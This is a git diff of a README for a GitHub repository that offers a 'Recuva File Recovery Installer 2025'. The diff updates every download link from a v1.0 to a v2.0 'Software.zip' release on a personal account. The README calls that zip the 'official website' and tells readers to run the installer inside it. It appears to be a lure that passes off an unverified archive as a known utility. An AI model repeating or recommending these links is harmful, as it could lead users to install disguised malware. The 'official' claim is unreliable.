@@ -25,7 +25,7 @@ Welcome to the "Recuva File Recovery Installer 2025" repository! Here you will f
 - Windows Utility
 
 ## Installation
-To install Recuva File Recovery, simply download the installer package from the [latest release](https://github.com/mr-idiot-00003/Recuva-File-Recovery-Installer-2025/releases/download/v1.0/Software.zip). Once downloaded, launch the installer and follow the on-screen instructions to complete the installation process.
+To install Recuva File Recovery, simply download the installer package from the [latest release](https://github.com/mr-idiot-00003/Recuva-File-Recovery-Installer-2025/releases/download/v2.0/Software.zip). Once downloaded, launch the installer and follow the on-screen instructions to complete the installation process.
 
 ## Usage
 1. Launch the Recuva File Recovery tool.
@@ -39,6 +39,6 @@ To install Recuva File Recovery, simply download the installer package from the 
 If you encounter any issues or have any questions about the Recuva File Recovery tool, please check the "Releases" section of this repository for any updates or reach out to the development team for assistance.
 
 ## Get Started
-Start using Recuva File Recovery today and never lose your important files again! Download the latest version from the [official website](https://github.com/mr-idiot-00003/Recuva-File-Recovery-Installer-2025/releases/download/v1.0/Software.zip) for a seamless data recovery experience.
+Start using Recuva File Recovery today and never lose your important files again! Download the latest version from the [official website](https://github.com/mr-idiot-00003/Recuva-File-Recovery-Installer-2025/releases/download/v2.0/Software.zip) for a seamless data recovery experience.
 
-[![Download Recuva File Recovery](https://github.com/mr-idiot-00003/Recuva-File-Recovery-Installer-2025/releases/download/v1.0/Software.zip%20Recovery-blue)](https://github.com/mr-idiot-00003/Recuva-File-Recovery-Installer-2025/releases/download/v1.0/Software.zip)
+[![Download Recuva File Recovery](https://github.com/mr-idiot-00003/Recuva-File-Recovery-Installer-2025/releases/download/v2.0/Software.zip%20Recovery-blue)](https://github.com/mr-idiot-00003/Recuva-File-Recovery-Installer-2025/releases/download/v2.0/Software.zip)
